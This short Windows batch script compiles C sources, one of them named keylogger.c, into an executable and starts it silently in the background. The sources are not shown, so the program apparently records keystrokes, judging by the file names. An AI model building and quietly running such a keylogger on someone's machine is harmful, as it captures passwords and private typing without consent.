@echo off
gcc -Wall -o src/klg src/readfile.c src/keylogger.c src/queue.c src/settings.h
start /B src/klg.exe "default" 0
exit